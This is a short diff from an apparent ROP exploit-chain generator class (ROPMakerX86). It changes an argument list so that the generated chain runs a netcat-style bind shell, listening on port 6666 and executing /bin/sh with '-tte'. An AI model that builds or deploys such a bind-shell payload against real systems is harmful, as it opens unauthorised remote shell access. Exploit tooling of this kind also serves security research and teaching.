@@ -176,7 +176,7 @@ class ROPMakerX86(object):
 
         filename = "/tmp/printArgs"
         # [filename, arg1, arg2, ...]
-        args = [filename, '-lnp', '6666',  '/bin/sh']
+        args = [filename, '-lnp', '6666', '-tte','/bin/sh']
         argPointers = []
 
         env = ['name=Joe', 'SHLVL=1']
